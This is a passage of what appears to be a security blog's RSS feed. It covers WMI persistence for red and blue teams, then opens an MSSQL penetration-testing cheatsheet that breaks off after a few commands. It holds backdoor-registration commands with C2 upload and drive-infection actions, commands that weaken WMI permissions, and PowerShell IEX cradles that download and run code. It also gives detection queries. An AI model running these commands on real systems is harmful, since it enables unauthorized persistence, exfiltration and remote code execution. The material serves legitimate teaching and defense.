&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Select the trigger&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="n">-TimingInterval&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">uint32&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">-TimerName&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">&amp;gt;]&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">-TriggerName&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">&amp;gt;]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="n">-Datetime&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">datetime&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="n">-ProcessName&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="n">-NewOrModifiedFileExtensions&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">[]&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">LockedScreen&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">InteractiveLogon&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$trigger&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorTrigger&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">DriveInsertion&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Select the action&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$action&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorAction&lt;/span> &lt;span class="n">-C2Uri&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">uri&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">-FileUpload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$action&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorAction&lt;/span> &lt;span class="n">-C2Uri&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">uri&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">-Backdoor&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$action&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorAction&lt;/span> &lt;span class="n">-KillProcess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$action&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-WMIBackdoorAction&lt;/span> &lt;span class="n">-InfectDriv&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Register the backdoor&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Register-WMIBackdoor&lt;/span> &lt;span class="n">-Trigger&lt;/span> &lt;span class="nv">$trigger&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="nv">$action&lt;/span> &lt;span class="p">[[&lt;/span>&lt;span class="n">-ComputerName&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="p">&amp;gt;]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or even by compiling MOF files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Compile a MOF file on the local machine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">mofcomp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">administrator&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">mof&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Compile a MOF file on a remote machine (need privs)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">mofcomp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-N&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">COMPUTER01&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">subscription&lt;/span> &lt;span class="n">c:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">administrator&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">mof&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="persistence---wmi-security-descriptors">Persistence - WMI Security Descriptors&lt;/h3>
&lt;p>It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of DCOM and WMI namespace to allow access to non-admin users. It obviousely requires admin privileges.&lt;/p>
&lt;p>&lt;a href="https://itconnect.uw.edu/wares/msinf/other-help/understanding-sddl-syntax/" target="_blank" rel="noopener">Security Descriptor Definition Language&lt;/a> uses ACE for both DACL and SACL:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>which for built-in administrators for WMI namespaces becomes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">A;CI;CCDCLCSWRPWPRCWD;;;SID
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Field&lt;/th>
&lt;th>Example&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>ace_type&lt;/td>
&lt;td>&amp;ldquo;A&amp;rdquo; - Access Allowed&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>ace_flags&lt;/td>
&lt;td>&amp;ldquo;CI&amp;rdquo; - Container Inherit&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>rights&lt;/td>
&lt;td>&amp;ldquo;CC&amp;rdquo; - Create Child&lt;br>&amp;ldquo;DC&amp;rdquo; - Delete Child&lt;br>&amp;ldquo;LC&amp;rdquo; - List Children&lt;br>&amp;ldquo;SW&amp;rdquo; - Self Write&lt;br>&amp;ldquo;RP&amp;rdquo; - Read Property&lt;br>&amp;ldquo;WP&amp;rdquo; - Write Property&lt;br>&amp;ldquo;RC&amp;rdquo; - Read Control&lt;br>&amp;ldquo;WD&amp;rdquo; - Write DAC&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>account_sid&lt;/td>
&lt;td>SID that identifies the trustee (user, group, &amp;hellip;) on which the ACE applies&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;code>Nishang&lt;/code> script &lt;code>Set-RemoteWMI.ps1&lt;/code> can be used to modify Security Descriptors of DCOM and WMI namespaces to provide non-admin domain users access to WMI:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># backdoor/Set-RemoteWMI.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Add permissions on the local machine for labuser to access all namespaces remotely.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="n">labuser&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Add permissions on the remote machine for labuser to access all namespaces remotely.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="n">labuser&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">34&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="n">admin&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Add permissions on the remote machine for labuser to access root\cimv2 and nested namespaces remotely.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="n">labuser&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">34&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="n">admin&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">namespace&lt;/span> &lt;span class="s1">&amp;#39;root\cimv2&amp;#39;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Add permissions on the remote machine for labuser to access only root\cimv2 remotely.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="n">labuser&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">34&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="n">admin&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">namespace&lt;/span> &lt;span class="s1">&amp;#39;root\cimv2&amp;#39;&lt;/span> &lt;span class="n">-NotAllNamespaces&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Remove the permissions added for labuser from the remote machine.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="n">labuser&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">0&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">34&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="n">admin&lt;/span> &lt;span class="n">-Remove&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="red-team-tools">Red Team Tools&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://github.com/0xbadjuju/PowerProvider" target="_blank" rel="noopener">PowerProvider&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/0xbadjuju/WheresMyImplant" target="_blank" rel="noopener">WheresMyImplant&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Sw4mpf0x/PowerLurk" target="_blank" rel="noopener">PowerLurk&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/FortyNorthSecurity/WMImplant" target="_blank" rel="noopener">WMIImplant&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="wmi-for-blue-teams">WMI for Blue Teams&lt;/h2>
&lt;h3 id="detecting-persistence">Detecting persistence&lt;/h3>
&lt;p>To detect persistence, common Filters, Consumer and Binding can be manually analyzed or a &amp;ldquo;detection&amp;rdquo; permanent event consumer can be created.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">__EventFilter&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\subscription&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">__EventConsumer&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\subscription&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">__FilterToConsumerBinding&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\subscription&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">ActiveScriptEventConsumer&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\subscription&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">CommandLineEventConsumer&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\subscription
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use WMI permanent event consumer to alert on:&lt;/p>
&lt;ul>
&lt;li>Registry persistence&lt;/li>
&lt;li>RegistryKeyChangeEvent&lt;/li>
&lt;li>RegistryValueChangeEvent&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$query&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;select * from RegistryValueChangeEvent where HIVE=&amp;#39;HKEY_LOCAL_MACHINE&amp;#39; AND KeyPath=&amp;#39;Software\\Microsoft\\Ole&amp;#39; AND ValueName=&amp;#39;MachineLaunchRestriction&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Register-WmiEvent&lt;/span> &lt;span class="n">-Query&lt;/span> &lt;span class="nv">$query&lt;/span> &lt;span class="n">-Action&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nb">Write-Host&lt;/span> &lt;span class="s2">&amp;#34;Modification of DCOM Permissions&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="detecting-storage-and-communication-channels">Detecting storage and communication channels&lt;/h3>
&lt;p>Use WMI permanent event consumer to alert on the creation of:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Namespaces&lt;/strong>: instances of __NamespaceCreationEvent&lt;/li>
&lt;li>&lt;strong>Classes&lt;/strong>: instances of __ClassCreationEvent&lt;/li>
&lt;/ul>
&lt;h3 id="analyzing-wmi-logs">Analyzing WMI Logs&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>Service Logs&lt;/strong>: Windows 10 and Windows Server 2016 raise &lt;strong>Event ID 5861&lt;/strong> in WMI-Activity Operational Logs when a permanent event consumer is created&lt;/li>
&lt;li>&lt;strong>Trace Logs&lt;/strong>: Huge volume, but very useful. &lt;strong>Event ID 11&lt;/strong> tells the username, command and remote box from someone connected to the local box and combined to &lt;strong>Event ID 20&lt;/strong> is useful for detecting persistence.&lt;/li>
&lt;/ul>
&lt;h3 id="blue-team-tools">Blue Team Tools&lt;/h3>
&lt;p>The following tools can be used for Blue Teams:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/luctalpe/WMIMon" target="_blank" rel="noopener">WMIMon&lt;/a> is a real-time Event Trace Log (ETL) consumer for WMI-Activity log&lt;/li>
&lt;li>&lt;a href="https://github.com/realparisi/WMI_Monitor" target="_blank" rel="noopener">WMI_Monitor&lt;/a> uses WMI permanent consumers to monitor the creation of other consumers. &lt;code>New-EventSubscribeMonitor&lt;/code> creates an entry with &lt;strong>Event ID 8&lt;/strong> in Application Event Log with source WSH.&lt;/li>
&lt;li>&lt;a href="https://github.com/proxb/PoshEventUI" target="_blank" rel="noopener">PoshEventUI&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/PowerShellMafia/CimSweep" target="_blank" rel="noopener">CIMSweep&lt;/a> performs incident response and hunting operations on scale by leveraging WMI/CIM.&lt;/li>
&lt;li>&lt;a href="https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS" target="_blank" rel="noopener">WMI-IDS&lt;/a> is a PoC agent-less host intrusion detection system. It is useful for detecting persistence mechanisms and raise alerts based on triggers.&lt;/li>
&lt;li>&lt;a href="https://github.com/davehull/Kansa" target="_blank" rel="noopener">Kansa&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="tools">Tools&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://gallery.technet.microsoft.com/scriptcenter/890ff802-9db2-4d25-aa13-4a2b22fe5db3" target="_blank" rel="noopener">Get-WmiNamespace.ps1&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/rzander/LocalAdmins" target="_blank" rel="noopener">Win32_LocalAdmins&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider" target="_blank" rel="noopener">Evil NEtwork Connection WMI Provider&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/0xbadjuju/PowerProvider" target="_blank" rel="noopener">PowerProvider&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/0xbadjuju/WheresMyImplant" target="_blank" rel="noopener">WheresMyImplant&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Sw4mpf0x/PowerLurk" target="_blank" rel="noopener">PowerLurk&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/FortyNorthSecurity/WMImplant" target="_blank" rel="noopener">WMIImplant&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/luctalpe/WMIMon" target="_blank" rel="noopener">WMIMon&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/proxb/PoshEventUI" target="_blank" rel="noopener">PoshEventUI&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/PowerShellMafia/CimSweep" target="_blank" rel="noopener">CIMSweep&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS" target="_blank" rel="noopener">WMI-IDS&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/davehull/Kansa" target="_blank" rel="noopener">Kansa&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" target="_blank" rel="noopener">Windows Management Instrumentation&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-service" target="_blank" rel="noopener">Win32_Service&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process" target="_blank" rel="noopener">Win32_Process&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-scheduledjob" target="_blank" rel="noopener">Win32_ScheduledJob&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/rzander/LocalAdmins" target="_blank" rel="noopener">Win32_LocalAdmins&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://itconnect.uw.edu/wares/msinf/other-help/understanding-sddl-syntax/" target="_blank" rel="noopener">Understanding SDDL Syntax&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/fireeye/flare-wmi/tree/master/DEFCON_23_Presentation" target="_blank" rel="noopener">DEF CON 23 slides and demo videos&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf" target="_blank" rel="noopener">Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and Fileless Backdoor&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://cansecwest.com/slides/2015/There%27s%20Something%20about%20WMI%20-%20Chris%20Glyer.pptx" target="_blank" rel="noopener">There&amp;rsquo;s something about WMI&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.slideshare.net/AlexanderLeary/building-better-backdoors-with-wmi-derbycon-2017" target="_blank" rel="noopener">Building better backdoors with WMI&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Microsoft SQL Server cheatsheet</title><link>https://www.peco602.com/post/0070-mssql-cheatsheet/</link><pubDate>Thu, 22 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0070-mssql-cheatsheet/</guid><description>&lt;p>&lt;strong>What is SQL Server?&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>A database platform&lt;/li>
&lt;li>A Windows application&lt;/li>
&lt;li>A set of Windows Services&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img src="./mssql_structure.png" alt="MSSQL Structure" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;em>Important Notes&lt;/em>&lt;/p>
&lt;ul>
&lt;li>OS command are usually executed as the service account&lt;/li>
&lt;li>The service account is a &lt;strong>sysadmin&lt;/strong> by default&lt;/li>
&lt;li>Clustered servers are required to have the same service account&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>How do I authenticate?&lt;/strong>&lt;/p>
&lt;p>Account Types:&lt;/p>
&lt;ul>
&lt;li>Windows Account:
&lt;ul>
&lt;li>Used to login&lt;/li>
&lt;li>Mapped to SQL Server login&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>SQL Server Login
&lt;ul>
&lt;li>Used to login&lt;/li>
&lt;li>Mapped to database account&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Database User
&lt;ul>
&lt;li>Used to access databases&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="d-flex justify-content-center">
&lt;div class="w-100" >&lt;img src="./mssql_authentication.png" alt="MSSQL Authentication" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;strong>Important Roles&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Server Roles:
&lt;ul>
&lt;li>Sysadmin = Database Administrator&lt;/li>
&lt;li>Public Role = Everyone with CONNECT&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Database Roles:
&lt;ul>
&lt;li>Database Owner = SQL login that owns the database ☺&lt;/li>
&lt;li>DB_OWNER role = Allows members to take most actions in the database&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. Database links work even across forest trusts.&lt;/p>
&lt;h2 id="powerupsql-setup">PowerUpSQL Setup&lt;/h2>
&lt;ol>
&lt;li>All possible setup options:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download to Disk + Import Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download from https://github.com/NetSPI/PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Import-Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">psd1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download/Import to Memory: Download Cradle 1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">IEX&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">WebClient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DownloadString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Download/Import to Memory: Common Download Cradle 2&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;amp;([&lt;/span>&lt;span class="no">scriptblock&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">Create&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nb">new-object&lt;/span> &lt;span class="n">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">webclient&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">downloadstring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Install Module from PowerShell Gallery&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Install-Module&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>List all PowerUpSQL available functions:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-Command&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Module&lt;/span> &lt;span class="n">PowerUpSQL&lt;/span>
